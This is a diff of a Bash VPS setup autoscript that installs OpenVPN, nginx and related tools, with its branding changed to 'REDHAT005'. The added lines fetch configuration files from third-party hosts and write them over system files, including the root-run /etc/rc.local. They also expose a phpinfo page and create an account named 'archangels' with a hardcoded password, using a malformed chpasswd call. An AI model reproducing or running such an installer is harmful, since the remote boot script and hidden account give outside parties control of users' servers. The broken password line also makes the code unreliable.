@@ -1,6 +1,36 @@
 #!/bin/bash
-
-
+# ******************************************
+# Program: Autoscript Servis REDHAT005
+# Website: REDHAT005
+# Developer: REDHAT005
+# Nickname: REDHAT005
+# Date: 22-07-2016
+# Last Updated: 22-08-2017
+# ******************************************
+# MULA SETUP
+myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
+myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+if [ $USER != 'root' ]; then
+echo "Sorry, for run the script please using root user"
+exit 1
+fi
+if [[ "$EUID" -ne 0 ]]; then
+echo "Sorry, you need to run this as root"
+exit 2
+fi
+if [[ ! -e /dev/net/tun ]]; then
+echo "TUN is not available"
+exit 3
+fi
+echo "
+AUTOSCRIPT BY OrangKuatSabahanTerkini
+AMBIL PERHATIAN !!!"
+clear
+echo "MULA SETUP"
+clear
+echo "SET TIMEZONE KUALA LUMPUT GMT +8"
+ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
+clear
 
 
 
@@ -35,10 +65,6 @@ apt-get -y install nginx php5-fpm php5-cli
 # install essential package
 apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter 
 apt-get -y install build-essential 
-
-# Install OpenVpn
-wget http://vpn989.com/script/openvpn.sh && chmod +x openvpn.sh && ./openvpn.sh
-	
 	
 
 # Disable Exim
@@ -77,6 +103,31 @@ sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php
 service php5-fpm restart
 service nginx restart
 
+# openvpn
+apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.tar "http://autoscriptnobita.tk/rendum/openvpn.tar"
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "http://autoscriptnobita.tk/rendum/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+# nginx
+apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
+rm /etc/nginx/sites-enabled/default
+rm /etc/nginx/sites-available/default
+wget -O /etc/php/7.0/fpm/pool.d/www.conf "http://rzvpn.net/random/www.conf"
+mkdir -p /home/vps/public_html
+echo "<pre>Setup by Nobita95 | telegram @nobinobita95 | website autoscriptnobita.tk</pre>" > /home/vps/public_html/index.php
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/rendum/vps.conf"
+sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
+wget -O /etc/motd "http://autoscriptnobita.tk/rendum/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
 
 # install badvpn
 wget -O /usr/bin/badvpn-udpgw "https://vpn989.com/script/badvpn-udpgw" 
@@ -309,7 +360,7 @@ service fail2ban restart
 
 # info
 clear
-echo "                  System Created by Vpn989"
+echo "                  System Created by REDHAT005"
 echo "          ==========***********==========="
 echo "==========================================================="
 echo "Service :" | tee -a log-install.txt
@@ -339,7 +390,7 @@ echo "Fail2Ban : [on]"
 echo "IPv6     : [off]"
 echo "Ddos Protect : [on]"
 echo "Torrent Protect [on]"
-echo "Website  : http://vpn989.com"
+echo "Website  : http://REDHAT005.com"
 echo ""
 echo "                        Sila Reboot VPS Anda !"
 echo "==========================================================="
